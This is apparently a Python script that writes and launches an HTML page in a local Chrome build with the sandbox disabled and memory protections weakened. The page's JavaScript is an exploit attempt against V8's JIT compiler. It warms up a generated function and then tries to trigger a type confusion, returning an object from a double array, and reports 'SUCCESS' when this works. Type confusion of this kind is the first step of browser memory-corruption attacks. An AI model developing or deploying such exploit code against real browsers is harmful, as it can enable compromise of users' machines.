import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
let dummy = { a: 1 };

function create_and_warmup() {
  let lines = [];
  lines.push("function sink_for_in(x, arr, obj) {");
  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
  lines.push(`
    arr[0] = obj;
    for (let k in obj) {
      return arr[1];
    }
    return 0;
  `);
  lines.push("}");
  lines.push("return sink_for_in;");
  let fn = new Function(lines.join("\\n"))();
  
  // Allocate pool of 20000 double arrays
  let pool = [];
  for (let i = 0; i < 20000; i++) {
    pool.push([1.1, 2.2, 3.3]);
  }
  
  // Warmup with transition every time
  for (let i = 0; i < 20000; i++) {
    fn(i, pool[i], dummy);
  }
  return fn;
}

async function main() {
  let fn = create_and_warmup();
  await new Promise(r => setTimeout(r, 500));
  
  let victim = [1.1, 2.2, 3.3];
  let res = fn(1000, victim, dummy);
  console.log("RESULT: type=" + (typeof res) + " val=" + res);
  if (typeof res === "object") {
    console.log("🔥🔥🔥 SUCCESS! Object:", res, "🔥🔥🔥");
  }
}
main();
</script></body></html>"""

with open("script/sink_for_in_pool.html", "w") as f:
    f.write(html)
profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/sink_for_in_pool.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=6)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()
for l in out.splitlines():
    if any(k in l for k in ["sink_for_in", "RESULT", "SUCCESS", "compil"]):
        print(l)
